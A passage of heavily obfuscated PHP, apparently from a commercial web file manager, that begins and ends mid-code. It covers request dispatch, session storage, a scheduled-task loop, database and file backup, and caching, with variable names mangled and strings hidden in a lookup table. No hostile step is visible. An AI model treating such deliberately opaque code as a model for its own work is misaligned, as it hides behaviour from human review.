$¨÷†‰¤¼ = !0; array_shift($ø¦à•–ğ); if (!is_object(self::$callbacks[$üöÚİí¤])) { $´š´« = explode($¹°ªşŒ¤[8], self::$callbacks[$üöÚİí¤]); $×ÈœÎ°Ä = end($´š´«); $¥‹Ú±¶« = explode($¹°ªşŒ¤[1214], $×ÈœÎ°Ä); $İ¬¶ª—š = new $¥‹Ú±¶«[0](); if (!method_exists($İ¬¶ª—š, $¥‹Ú±¶«[1])) { echo $¹°ªşŒ¤[1618]; } else { call_user_func_array(array($İ¬¶ª—š, $¥‹Ú±¶«[1]), $ø¦à•–ğ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$üöÚİí¤], $ø¦à•–ğ); if (self::$halts) { return; } } } } $üöÚİí¤++; } } if ($¨÷†‰¤¼ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $·ÜÚ¬â¨ =& $_SERVER[Ì¥ŞÒ°£]; header($_SERVER[$·ÜÚ¬â¨[1619]] . $·ÜÚ¬â¨[1620]); echo $·ÜÚ¬â¨[1621]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¹°ªşŒ¤[1614]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $šï•»‚ú =& $_SERVER[Ì¥ŞÒ°£]; static $Êë½Ä = false; if ($Êë½Ä) { return $Êë½Ä; } $ºº¥Üíª = $GLOBALS[$šï•»‚ú[6]][$šï•»‚ú[349]]; self::$sessionTime = $ºº¥Üíª[$šï•»‚ú[1622]]; $³ñáÇö = isset($GLOBALS[$šï•»‚ú[1623]]) ? $GLOBALS[$šï•»‚ú[1623]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($³ñáÇö)) { self::$sessionSign = Cookie::get($³ñáÇö); } else { self::$sessionSign = guid(); } } Cookie::setSafe($³ñáÇö, self::$sessionSign, self::$sessionTime); $‰ß¢ …Ñ = $ºº¥Üíª[$šï•»‚ú[1624]]; $Ê“İ±Ç€ = $ºº¥Üíª[$‰ß¢ …Ñ]; $ÆøÑè = $ºº¥Üíª[$šï•»‚ú[830]]; switch ($‰ß¢ …Ñ) { case $šï•»‚ú[21]: self::$handle = Model($šï•»‚ú[831]); break; case $šï•»‚ú[832]: self::$handle = new CacheRedis($Ê“İ±Ç€, $ÆøÑè); break; case $šï•»‚ú[833]: self::$handle = new CacheMemcached($Ê“İ±Ç€, $ÆøÑè); break; case $šï•»‚ú[199]: $Ê“İ±Ç€[$šï•»‚ú[84]] = $Ê“İ±Ç€[$šï•»‚ú[84]] . $šï•»‚ú[1625]; self::$handle = new CacheFile($Ê“İ±Ç€, $ÆøÑè); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Êë½Ä = new self(); return $Êë½Ä; } public static function getBySign($»æäÊÓ) { CacheLock::lock($»æäÊÓ); $ÈÜûì×ñ = self::$handle->get($»æäÊÓ); CacheLock::unlock($»æäÊÓ); $ÈÜûì×ñ = unserialize($ÈÜûì×ñ); return is_array($ÈÜûì×ñ) ? $ÈÜûì×ñ : array(); } public static function setBySign($İ¡ò™ ş, $ã†·Š§) { CacheLock::lock($İ¡ò™ ş); self::$handle->set($İ¡ò™ ş, serialize($ã†·Š§), self::$sessionTime); CacheLock::unlock($İ¡ò™ ş); } public static function sign($ò ñªŞ¢ = false) { $ò ñªŞ¢ && (self::$sessionSign = $ò ñªŞ¢); self::init(); return self::$sessionSign; } public static function set($ÜÂ·—¸â, $¹áøöÍ¢ = false) { self::init(); if (is_array($ÜÂ·—¸â)) { foreach ($ÜÂ·—¸â as $•«â ££ => $ÑÉ£‘è) { array_set_value(self::$data, $•«â ££, $ÑÉ£‘è); } } else { array_set_value(self::$data, $ÜÂ·—¸â, $¹áøöÍ¢); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÛÌ–íŸĞ = false) { self::init(); if (!$ÛÌ–íŸĞ) { return self::$data; } return array_get_value(self::$data, $ÛÌ–íŸĞ); } public static function remove($‡Ø§Ö¿À) { self::init(); unset(self::$data[$‡Ø§Ö¿À]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ì¥ŞÒ°£][835])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÛÎÆü¹ç =& $_SERVER[Ì¥ŞÒ°£]; if (self::valueGet($ÛÎÆü¹ç[752]) != $ÛÎÆü¹ç[88]) { return; } if (self::valueGet($ÛÎÆü¹ç[1626]) == $ÛÎÆü¹ç[88]) { $ïå¬‰Õ = self::valueGet($ÛÎÆü¹ç[1627]); if (time() - $ïå¬‰Õ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$ÛÎÆü¹ç[1628]] = 1; self::valueSet($ÛÎÆü¹ç[1626], $ÛÎÆü¹ç[88]); self::log($ÛÎÆü¹ç[1629] . ACTION . $ÛÎÆü¹ç[1630]); Session::$data = array(); Session::$sessionSign = $ÛÎÆü¹ç[12]; $GLOBALS[$ÛÎÆü¹ç[503]] = 1; Hook::bind($ÛÎÆü¹ç[1631], $ÛÎÆü¹ç[1632]); $…¹›À£» = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÛÎÆü¹ç[752]) != $ÛÎÆü¹ç[88]) { self::valueSet($ÛÎÆü¹ç[1626], $ÛÎÆü¹ç[197]); self::log($ÛÎÆü¹ç[1633]); die; } $ëñ¯¯Šˆ = time(); if ($ëñ¯¯Šˆ - $…¹›À£» >= 60) { self::valueSet(array($ÛÎÆü¹ç[1626] => $ÛÎÆü¹ç[88], $ÛÎÆü¹ç[1627] => $ëñ¯¯Šˆ), !1); $…¹›À£» = $ëñ¯¯Šˆ; } if (!file_exists(USER_SYSTEM . $ÛÎÆü¹ç[1634])) { self::valueSet(array($ÛÎÆü¹ç[1626] => $ÛÎÆü¹ç[197], $ÛÎÆü¹ç[752] => $ÛÎÆü¹ç[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $·ªøÓ„ =& $_SERVER[Ì¥ŞÒ°£]; http_close(); self::valueSet($·ªøÓ„[752], $·ªøÓ„[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($·ªøÓ„[1626] => $·ªøÓ„[197], $·ªøÓ„[752] => $·ªøÓ„[88]), !1); } public static function taskSwitch() { $ÈäùÛØ° =& $_SERVER[Ì¥ŞÒ°£]; $Óå¡†øÉ = self::valueGet($ÈäùÛØ°[752]) == $ÈäùÛØ°[88] ? $ÈäùÛØ°[197] : $ÈäùÛØ°[88]; self::valueSet($ÈäùÛØ°[752], $Óå¡†øÉ); } public static function shutdownEvent() { $æ¾ó×é÷ =& $_SERVER[Ì¥ŞÒ°£]; self::valueSet($æ¾ó×é÷[1626], $æ¾ó×é÷[197]); self::log($æ¾ó×é÷[1635]); } public static function config($«Ú¶üáî, $ÓØÊ×™ï) { self::valueSet($_SERVER[Ì¥ŞÒ°£][752], $«Ú¶üáî); } private static function taskRunAll() { $•›€†Ê© =& $_SERVER[Ì¥ŞÒ°£]; $Ëòş²êŒ = timeFloat(); $àÍ‘®Ê‹ = Model($•›€†Ê©[1636])->listData(); $¬ò¢Çä = count($àÍ‘®Ê‹); for ($ğ©•±ƒŞ = 0; $ğ©•±ƒŞ < $¬ò¢Çä; $ğ©•±ƒŞ++) { $¿İıÌÔ = $àÍ‘®Ê‹[$ğ©•±ƒŞ]; if (!$¿İıÌÔ[$•›€†Ê©[399]] || $¿İıÌÔ[$•›€†Ê©[1637]] != $•›€†Ê©[88]) { continue; } if (!self::taskTimeCheck($¿İıÌÔ)) { continue; } self::taskRun($¿İıÌÔ); } Hook::trigger($•›€†Ê©[1638]); self::taskQueueRun($Ëòş²êŒ); } private static function taskQueueRun($’Ş°ûõç) { $ËÇ³š = 10; while (!0) { $ ³ä¼œ± = TaskQueue::run(); if ($ ³ä¼œ± === !1) { break; } if (timeFloat() - $’Ş°ûõç >= $ËÇ³š) { break; } } } private static function taskTimeCheck($âı¥ÎÇ‘) { $˜’½‡šÁ =& $_SERVER[Ì¥ŞÒ°£]; $¦ŒŠèÍ™ = json_decode($âı¥ÎÇ‘[$˜’½‡šÁ[203]], !0); $àüàÄ = intval($âı¥ÎÇ‘[$˜’½‡šÁ[1627]]); $‰ê˜ôö = strtotime($˜’½‡šÁ[1639] . $¦ŒŠèÍ™[$˜’½‡šÁ[1640]] . $˜’½‡šÁ[1641]) - strtotime($˜’½‡šÁ[1642]); $µÆ—–ïì = time() - strtotime(date($˜’½‡šÁ[1643]) . $˜’½‡šÁ[1644]); $¬³É¤Ãà = $µÆ—–ïì >= $‰ê˜ôö && $µÆ—–ïì <= $‰ê˜ôö + 3600; switch ($¦ŒŠèÍ™[$˜’½‡šÁ[33]]) { case $˜’½‡šÁ[1645]: if (time() - $àüàÄ < 3600 * 24 * 30) { return !1; } if ($¦ŒŠèÍ™[$˜’½‡šÁ[1645]] == date($˜’½‡šÁ[1646]) && $¬³É¤Ãà) { return !0; } break; case $˜’½‡šÁ[1647]: if (time() - $àüàÄ < 3600 * 24 * 7) { return !1; } $²ëĞŠ²¥ = date($˜’½‡šÁ[1648]) == 0 ? 7 : date($˜’½‡šÁ[1648]); if ($¦ŒŠèÍ™[$˜’½‡šÁ[1647]] == $²ëĞŠ²¥ && $¬³É¤Ãà) { return !0; } break; case $˜’½‡šÁ[1640]: if (time() - $àüàÄ < 3600 * 24) { return !1; } if ($¬³É¤Ãà) { return !0; } break; case $˜’½‡šÁ[1649]: if (time() - $àüàÄ >= floatval($¦ŒŠèÍ™[$˜’½‡šÁ[1649]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $›¶ëé©ò =& $_SERVER[Ì¥ŞÒ°£]; static $ İ¨ÛÇÃ = 0; $µıÁÃøë = 300; if (!$ İ¨ÛÇÃ) { $ İ¨ÛÇÃ = time(); } if (time() - $ İ¨ÛÇÃ < $µıÁÃøë) { return; } $ İ¨ÛÇÃ = time(); $û ÏÇË = Model($›¶ëé©ò[513])->db($›¶ëé©ò[12]); if ($û ÏÇË) { $û ÏÇË->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($›¶ëé©ò[1650], $›¶ëé©ò[1651]); die; } } public static function taskRun($­İÇ°€½) { $¤ù¹’Ğè =& $_SERVER[Ì¥ŞÒ°£]; self::log($¤ù¹’Ğè[1652] . $­İÇ°€½[$¤ù¹’Ğè[399]] . $¤ù¹’Ğè[1653] . $­İÇ°€½[$¤ù¹’Ğè[32]] . $¤ù¹’Ğè[1654] . $­İÇ°€½[$¤ù¹’Ğè[1655]]); Model($¤ù¹’Ğè[1636])->run($­İÇ°€½[$¤ù¹’Ğè[399]]); $¸Àç¯’ = timeFloat(); $Ïïû±º± = $¤ù¹’Ğè[12]; switch ($­İÇ°€½[$¤ù¹’Ğè[33]]) { case $¤ù¹’Ğè[307]: $ŸÂ×ò“ = url_request($­İÇ°€½[$¤ù¹’Ğè[1655]], $¤ù¹’Ğè[230], !1, !1, !1, !1, 10); if ($ŸÂ×ò“[$¤ù¹’Ğè[752]]) { $Ïïû±º± = strlen($ŸÂ×ò“[$¤ù¹’Ğè[1208]]); } break; case $¤ù¹’Ğè[229]: $Ïïû±º± = Hook::apply($­İÇ°€½[$¤ù¹’Ğè[1655]]); default: break; } Model($¤ù¹’Ğè[1656])->add(array($¤ù¹’Ğè[1657] => $¤ù¹’Ğè[12], $¤ù¹’Ğè[1658] => $¤ù¹’Ğè[197], $¤ù¹’Ğè[33] => $¤ù¹’Ğè[1659] . $­İÇ°€½[$¤ù¹’Ğè[399]], $¤ù¹’Ğè[1660] => json_encode(array($¤ù¹’Ğè[32] => $­İÇ°€½[$¤ù¹’Ğè[32]], $¤ù¹’Ğè[1661] => timeFloat() - $¸Àç¯’, $¤ù¹’Ğè[293] => $Ïïû±º±)))); $‚ŒóÅ¹ = $Ïïû±º± ? $¤ù¹’Ğè[1662] . $Ïïû±º± : $¤ù¹’Ğè[12]; self::log($¤ù¹’Ğè[1663] . $­İÇ°€½[$¤ù¹’Ğè[399]] . $¤ù¹’Ğè[164] . $‚ŒóÅ¹); return !0; } private static function valueGet($ÖÎŞ©Î) { $’Â—Şû  =& $_SERVER[Ì¥ŞÒ°£]; $Íµ‘î‹ = $’Â—Şû [1664]; $–å ôÅø = Model($’Â—Şû [435])->get($ÖÎŞ©Î, $Íµ‘î‹); if (is_null($–å ôÅø)) { Model($’Â—Şû [435])->set($’Â—Şû [752], $’Â—Şû [88], $Íµ‘î‹); Model($’Â—Şû [435])->set($’Â—Şû [1626], $’Â—Şû [197], $Íµ‘î‹); $–å ôÅø = Model($’Â—Şû [435])->get($ÖÎŞ©Î, $Íµ‘î‹); } return $–å ôÅø; } private static function valueSet($ªÕŠÁ, $äª¶¹Éµ) { $ÂĞ†ùé” =& $_SERVER[Ì¥ŞÒ°£]; $şªÍ£Êñ = $ÂĞ†ùé”[1665]; CacheLock::lock($şªÍ£Êñ); $¬’‚¾íÖ = Model($ÂĞ†ùé”[435])->set($ªÕŠÁ, $äª¶¹Éµ, $ÂĞ†ùé”[1664]); CacheLock::unlock($şªÍ£Êñ); return $¬’‚¾íÖ; } protected static function log($ğ­ˆ¡Ü) { write_log($ğ­ˆ¡Ü, $_SERVER[Ì¥ŞÒ°£][1651]); } private static function cacheClear() { $•‘Ò­¾ê =& $_SERVER[Ì¥ŞÒ°£]; Cache::clearMemory(Model($•‘Ò­¾ê[435])->cacheKey($•‘Ò­¾ê[1664])); Cache::clearMemory(Model($•‘Ò­¾ê[435])->cacheKey($•‘Ò­¾ê[1666])); Model($•‘Ò­¾ê[1636])->cacheClear(); self::closeDatabase(); } } goto d´àß¶”ªÓ; f«´Òš¹¨: class BackupDbFile { public function __construct() { } public function index() { $®ˆÒ‚²Ö =& $_SERVER[Ì¥ŞÒ°£]; $°‚Ÿ‚¢ = Backup::get(); $‰çö½‰ = $°‚Ÿ‚¢[$®ˆÒ‚²Ö[32]]; $ïà‚Ú = $this->tmpFilesPath() . "\142\141\x63\153\x75\160\x5f{$‰çö½‰}\x2f"; $£¥ì‹‚‘ = $this->backupPath($°‚Ÿ‚¢); if (!($£¥ì‹‚‘ = IO::mkdir($£¥ì‹‚‘))) { return !1; } $‘²³¾²ñ = IO::listPath($ïà‚Ú); $±¥»éß© = isset($‘²³¾²ñ[$®ˆÒ‚²Ö[83]]) ? $‘²³¾²ñ[$®ˆÒ‚²Ö[83]] : array(); $´Îºò– = array_sum(array_column($±¥»éß©, $®ˆÒ‚²Ö[76])); if (!$´Îºò–) { return !1; } $Ç¢­—âÖ = array($®ˆÒ‚²Ö[800] => $´Îºò–, $®ˆÒ‚²Ö[801] => time()); Backup::set($Ç¢­—âÖ); $ñëêæ´Ï = new TaskFileTransfer($®ˆÒ‚²Ö[802], $®ˆÒ‚²Ö[782], count($±¥»éß©), LNG($®ˆÒ‚²Ö[783]) . $®ˆÒ‚²Ö[386] . LNG($®ˆÒ‚²Ö[785]) . $®ˆÒ‚²Ö[803]); $ñëêæ´Ï->task[$®ˆÒ‚²Ö[765]] = $´Îºò–; foreach ($‘²³¾²ñ[$®ˆÒ‚²Ö[83]] as $ö“ñ–ºĞ) { $·øãêˆô = IO::move($ö“ñ–ºĞ[$®ˆÒ‚²Ö[84]], $£¥ì‹‚‘); if (!$·øãêˆô) { $ñëêæ´Ï->end(); $Î®  ı = IO::getLastError($®ˆÒ‚²Ö[804] . $ö“ñ–ºĞ[$®ˆÒ‚²Ö[84]] . $®ˆÒ‚²Ö[805] . $£¥ì‹‚‘ . $®ˆÒ‚²Ö[164]); write_log($Î®  ı, $®ˆÒ‚²Ö[782]); return !1; } } $ĞÁ‰½Ùà = new DbManage(); $‚ĞÂ¨Â = $ĞÁ‰½Ùà->getSqlFile(); if (!$‚ĞÂ¨Â[$®ˆÒ‚²Ö[806]] || !$‚ĞÂ¨Â[$®ˆÒ‚²Ö[13]]) { return !1; } IO::move($‚ĞÂ¨Â[$®ˆÒ‚²Ö[806]], $£¥ì‹‚‘); IO::move($‚ĞÂ¨Â[$®ˆÒ‚²Ö[13]], $£¥ì‹‚‘); $ñëêæ´Ï->end(); $Ç¢­—âÖ = array($®ˆÒ‚²Ö[807] => $´Îºò–, $®ˆÒ‚²Ö[808] => time()); Backup::set($Ç¢­—âÖ); return !0; } private function backupPath($ÔÃõÑ„) { $¸ƒ˜†•ı =& $_SERVER[Ì¥ŞÒ°£]; $‡”Ë„· = $ÔÃõÑ„[$¸ƒ˜†•ı[32]]; $˜ôü§í– = Model($¸ƒ˜†•ı[772])->get($¸ƒ˜†•ı[773]); $¯™÷¢©Ú = substr(md5($¸ƒ˜†•ı[774] . $˜ôü§í– . $‡”Ë„·), 0, 8); return "\173\151\157\x3a{$ÔÃõÑ„[$¸ƒ˜†•ı[754]]}\175\x2f\x64\141\x74\x61\142\141\x73\x65\x2f\142\x61\x63\153\x75\160\57" . $‡”Ë„· . $¸ƒ˜†•ı[11] . $¯™÷¢©Ú; } private function tmpFilesPath() { $ÀñŠŠäŠ =& $_SERVER[Ì¥ŞÒ°£]; $Äê¯Ö­Œ = TEMP_FILES; if ($GLOBALS[$ÀñŠŠäŠ[6]][$ÀñŠŠäŠ[89]][$ÀñŠŠäŠ[798]]) { $Äê¯Ö­Œ = $GLOBALS[$ÀñŠŠäŠ[6]][$ÀñŠŠäŠ[89]][$ÀñŠŠäŠ[798]]; if (!mk_dir($Äê¯Ö­Œ) || !is_writable($Äê¯Ö­Œ) || !IO::mkfile($Äê¯Ö­Œ . $ÀñŠŠäŠ[799])) { $Äê¯Ö­Œ = TEMP_FILES; } } return $Äê¯Ö­Œ; } } class BackupFile { public function __construct() { } public function index() { $¹º¹«ßø = Backup::get(); $ï……œÊ… = $¹º¹«ßø[$_SERVER[Ì¥ŞÒ°£][293]][$_SERVER[Ì¥ŞÒ°£][199]][$_SERVER[Ì¥ŞÒ°£][468]]; $æÈë¶Ûô = array($_SERVER[Ì¥ŞÒ°£][469] => array($_SERVER[Ì¥ŞÒ°£][809], $ï……œÊ…), $_SERVER[Ì¥ŞÒ°£][810] => array($_SERVER[Ì¥ŞÒ°£][331], $¹º¹«ßø[$_SERVER[Ì¥ŞÒ°£][754]])); $®ß÷Ç²ƒ = (int) Model($_SERVER[Ì¥ŞÒ°£][791])->where($æÈë¶Ûô)->count($_SERVER[Ì¥ŞÒ°£][468]); $ƒÍŞ½ª´ = (int) Model($_SERVER[Ì¥ŞÒ°£][791])->where($æÈë¶Ûô)->sum($_SERVER[Ì¥ŞÒ°£][76]); $ƒïï¬„Á = new TaskFileTransfer($_SERVER[Ì¥ŞÒ°£][811], $_SERVER[Ì¥ŞÒ°£][782], $®ß÷Ç²ƒ, LNG($_SERVER[Ì¥ŞÒ°£][783]) . $_SERVER[Ì¥ŞÒ°£][784] . LNG($_SERVER[Ì¥ŞÒ°£][812])); $ƒïï¬„Á->task[$_SERVER[Ì¥ŞÒ°£][765]] = $ƒÍŞ½ª´; $Âïªè = array($_SERVER[Ì¥ŞÒ°£][813] => $®ß÷Ç²ƒ, $_SERVER[Ì¥ŞÒ°£][814] => $ƒÍŞ½ª´, $_SERVER[Ì¥ŞÒ°£][815] => time()); Backup::set($Âïªè); $§ˆ°°‚— = !0; $¸«‡ù„ = $this->storeIds(); $¦¿ù«ğ² = 1; $¤áÎ = 1000; $œ¡Ã¤¸ = $›¤Ú£Ÿñ = 0; $·²ÏÏ˜ß = array(); $¢àÛŒ›¾ = $ì‰›öàĞ = 0; do { $Ù–Œµî£ = $_SERVER[Ì¥ŞÒ°£][816]; $¬©ä´Ó = Model($_SERVER[Ì¥ŞÒ°£][791])->where($æÈë¶Ûô)->field($Ù–Œµî£)->order($_SERVER[Ì¥ŞÒ°£][817])->selectPage($¤áÎ, $¦¿ù«ğ²); $†õ‡Ï’ = !empty($¬©ä´Ó[$_SERVER[Ì¥ŞÒ°£][369]]) ? $¬©ä´Ó[$_SERVER[Ì¥ŞÒ°£][369]] : array(); foreach ($†õ‡Ï’ as $çæúÁ•§) { if (!$this->_fileExist($çæúÁ•§, $·²ÏÏ˜ß, $¸«‡ù„)) { $®ß÷Ç²ƒ -= 1; $ƒÍŞ½ª´ -= (int) $çæúÁ•§[$_SERVER[Ì¥ŞÒ°£][76]]; write_log("\146\151\x6c\x65\40\x6e\157\164\40\x65\170\x69\163\164\56\146\x69\154\x65\x49\104\x3a{$çæúÁ•§[$_SERVER[Ì¥ŞÒ°£][468]]}\54\x20\160\141\x74\x68\72{$çæúÁ•§[$_SERVER[Ì¥ŞÒ°£][84]]}", $_SERVER[Ì¥ŞÒ°£][818]); continue; } $²ùÌ¢äù = $çæúÁ•§[$_SERVER[Ì¥ŞÒ°£][84]]; $—¶¥ ˆĞ = "\173\x69\157\x3a{$¹º¹«ßø[$_SERVER[Ì¥ŞÒ°£][754]]}\x7d" . substr($²ùÌ¢äù, strlen("\173\151\x6f\72{$çæúÁ•§[$_SERVER[Ì¥ŞÒ°£][819]]}\175")); if (IO::exist($—¶¥ ˆĞ)) { $ƒïï¬„Á->updateFileEnd($çæúÁ•§[$_SERVER[Ì¥ŞÒ°£][32]], $çæúÁ•§[$_SERVER[Ì¥ŞÒ°£][76]]); } else { $—¶¥ ˆĞ = get_path_father($—¶¥ ˆĞ); IO::mkdir($—¶¥ ˆĞ); if (!IO::copy($²ùÌ¢äù, $—¶¥ ˆĞ, $_SERVER[Ì¥ŞÒ°£][820])) { write_log($_SERVER[Ì¥ŞÒ°£][821] . $²ùÌ¢äù . $_SERVER[Ì¥ŞÒ°£][805] . $—¶¥ ˆĞ . $_SERVER[Ì¥ŞÒ°£][164], $_SERVER[Ì¥ŞÒ°£][782]); $§ˆ°°‚— = !1; break; } } $ï……œÊ… = $çæúÁ•§[$_SERVER[Ì¥ŞÒ°£][468]]; $›¤Ú£Ÿñ += 1; $œ¡Ã¤¸ += $çæúÁ•§[$_SERVER[Ì¥ŞÒ°£][76]]; $ì‰›öàĞ += 1; $¢àÛŒ›¾ += $çæúÁ•§[$_SERVER[Ì¥ŞÒ°£][76]]; if ($œ¡Ã¤¸ >= 1024 * 1024 * 100) { $Âïªè = array($_SERVER[Ì¥ŞÒ°£][822] => $ï……œÊ…, $_SERVER[Ì¥ŞÒ°£][823] => $ì‰›öàĞ, $_SERVER[Ì¥ŞÒ°£][824] => $¢àÛŒ›¾); Backup::set($Âïªè); $œ¡Ã¤¸ = $›¤Ú£Ÿñ = 0; } } $Õ„ÌŠÃò = count($†õ‡Ï’); $¦¿ù«ğ²++; } while ($Õ„ÌŠÃò == $¤áÎ); $ƒïï¬„Á->end(); $Âïªè = array($_SERVER[Ì¥ŞÒ°£][825] => 1, $_SERVER[Ì¥ŞÒ°£][497] => time(), $_SERVER[Ì¥ŞÒ°£][777] => 1, $_SERVER[Ì¥ŞÒ°£][822] => $ï……œÊ…, $_SERVER[Ì¥ŞÒ°£][814] => $ƒÍŞ½ª´, $_SERVER[Ì¥ŞÒ°£][813] => $®ß÷Ç²ƒ, $_SERVER[Ì¥ŞÒ°£][826] => time()); if ($›¤Ú£Ÿñ) { $Âïªè[$_SERVER[Ì¥ŞÒ°£][823]] = $ì‰›öàĞ; $Âïªè[$_SERVER[Ì¥ŞÒ°£][824]] = $¢àÛŒ›¾; } Backup::set($Âïªè); $this->_fileFilter($·²ÏÏ˜ß); return !0; } private function _fileExist($ËŒëÄ¨, &$¥®‘üÕ, $Õù€ûÇ«) { $‘ÙÊéßˆ =& $_SERVER[Ì¥ŞÒ°£]; $ŒùÖ®“Î = $ËŒëÄ¨[$‘ÙÊéßˆ[84]]; if (in_array($ËŒëÄ¨[$‘ÙÊéßˆ[468]], $¥®‘üÕ)) { return !1; } if (!in_array($ËŒëÄ¨[$‘ÙÊéßˆ[819]], $Õù€ûÇ«)) { return !1; } if (IO::exist($ŒùÖ®“Î)) { return !0; } $Şå‚˜ìƒ = get_path_father($ŒùÖ®“Î); if (IO::exist($Şå‚˜ìƒ)) { $¥®‘üÕ[] = $ËŒëÄ¨[$‘ÙÊéßˆ[468]]; return !1; } $·ş¤€Í‘ = array($‘ÙÊéßˆ[819] => $ËŒëÄ¨[$‘ÙÊéßˆ[819]], $‘ÙÊéßˆ[84] => array($‘ÙÊéßˆ[383], "{$Şå‚˜ìƒ}\x25")); $úÜ»ëÙÀ = Model($‘ÙÊéßˆ[791])->where($·ş¤€Í‘)->field($‘ÙÊéßˆ[469])->select(); $¥®‘üÕ = array_merge($¥®‘üÕ, array_to_keyvalue($úÜ»ëÙÀ, $‘ÙÊéßˆ[12], $‘ÙÊéßˆ[468])); return !1; } private function _fileFilter($å¯„‘¯¾) { $¿é·‰¸ô =& $_SERVER[Ì¥ŞÒ°£]; if (empty($å¯„‘¯¾)) { return; } $ß¸¦Ó¡ = array($¿é·‰¸ô[468] => array($¿é·‰¸ô[7], array_unique($å¯„‘¯¾))); $ ²”Ù€ = Model($¿é·‰¸ô[827])->where($ß¸¦Ó¡)->field($¿é·‰¸ô[402])->select(); foreach ($ ²”Ù€ as $ú¬ÇÊØê) { Model($¿é·‰¸ô[827])->remove($ú¬ÇÊØê[$¿é·‰¸ô[402]], !1); } } private function storeIds() { $’úŸˆùè =& $_SERVER[Ì¥ŞÒ°£]; $ÏÑ¢Ò„É = Model($’úŸˆùè[769])->listData(); $³•÷ã = array(); $ÒÜ’»Ğñ = $GLOBALS[$’úŸˆùè[6]][$’úŸˆùè[89]][$’úŸˆùè[828]]; foreach ($ÏÑ¢Ò„É as $È¨Ìµ¹È) { $·ÚâÑÑ× = strtolower($È¨Ìµ¹È[$’úŸˆùè[95]]); if (!isset($ÒÜ’»Ğñ[$·ÚâÑÑ×])) { continue; } $·®¼‡Åá = $’úŸˆùè[74] . (isset($ÒÜ’»Ğñ[$·ÚâÑÑ×]) ? $ÒÜ’»Ğñ[$·ÚâÑÑ×] : ucfirst($·ÚâÑÑ×)); if (!class_exists($·®¼‡Åá)) { continue; } $³•÷ã[] = $È¨Ìµ¹È[$’úŸˆùè[399]]; } return $³•÷ã; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $éÊ´çã =& $_SERVER[Ì¥ŞÒ°£]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $©ãôºÃò = $GLOBALS[$éÊ´çã[6]][$éÊ´çã[349]]; $™ÀëËï¬ = $©ãôºÃò[$©ãôºÃò[$éÊ´çã[829]]]; $¦¸ìãáù = $©ãôºÃò[$éÊ´çã[830]]; switch ($©ãôºÃò[$éÊ´çã[829]]) { case $éÊ´çã[21]: self::$handle = Model($éÊ´çã[831]); break; case $éÊ´çã[832]: self::$handle = new CacheRedis($™ÀëËï¬, $¦¸ìãáù); break; case $éÊ´çã[833]: self::$handle = new CacheMemcached($™ÀëËï¬, $¦¸ìãáù); break; case $éÊ´çã[199]: self::$handle = new CacheFile($™ÀëËï¬, $¦¸ìãáù); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($•«ÁÌĞ) { if (is_array($•«ÁÌĞ) || is_object($•«ÁÌĞ)) { $•«ÁÌĞ = json_encode($•«ÁÌĞ); } $•«ÁÌĞ = rawurlencode($•«ÁÌĞ); return md5(KOD_SITE_ID . $_SERVER[Ì¥ŞÒ°£][11] . $•«ÁÌĞ); } public static function get($¦ÖßçÒ¡, $šÛ’õ¨Ô = false) { $Çã­œÙ¾ = self::key($¦ÖßçÒ¡); if ($šÛ’õ¨Ô) { return unserialize(self::init()->get($Çã­œÙ¾)); } if (!isset(self::$memoryCache[$Çã­œÙ¾])) { $Ü‰’íªª = self::init()->get($Çã­œÙ¾); self::$memoryCache[$Çã­œÙ¾] = unserialize($Ü‰’íªª); } return self::$memoryCache[$Çã­œÙ¾]; } public static function set($â¹Å¸Æş, $àÄ¬ê‚¤, $ğ¨®† = false) { $…­©éÂ§ = self::key($â¹Å¸Æş); if (isset(self::$memoryCache[$…­©éÂ§]) && self::$memoryCache[$…­©éÂ§] === $àÄ¬ê‚¤) { return !0; } if ($ğ¨®† === 0) { self::$memoryCache[$…­©éÂ§] = $àÄ¬ê‚¤; return !0; } CacheLock::lock($â¹Å¸Æş); $—¢¦Úš© = self::init()->set($…­©éÂ§, serialize($àÄ¬ê‚¤), $ğ¨®†); self::$memoryCache[$…­©éÂ§] = $àÄ¬ê‚¤; CacheLock::unlock($â¹Å¸Æş); return $—¢¦Úš©; } public static function getCall($ù¤­úÑÒ, $Ù„¨áêã, $Ç©µÃ¼¼, $°ùØ–æÌ = array()) { $àŞÀÁ¦¬ =& $_SERVER[Ì¥ŞÒ°£]; $÷ìøÄÍ‹ = self::get($ù¤­úÑÒ); if ($÷ìøÄÍ‹ || $÷ìøÄÍ‹ === $àŞÀÁ¦¬[12]) { return $÷ìøÄÍ‹; } $÷ìøÄÍ‹ = call_user_func_array($Ç©µÃ¼¼, $°ùØ–æÌ); $÷ìøÄÍ‹ = $÷ìøÄÍ‹ ? $÷ìøÄÍ‹ : $àŞÀÁ¦¬[12]; self::set($ù¤­úÑÒ, $÷ìøÄÍ‹, $Ù„¨áêã); return $÷ìøÄÍ‹; } public static function remove($ü…Ï‹—¤) { $ÁĞ£µŒ = self::key($ü…Ï‹—¤); unset(self::$memoryCache[$ÁĞ£µŒ]); self::clearTimeout(); CacheLock::lock($ü…Ï‹—¤); $ñŞáë¤º = 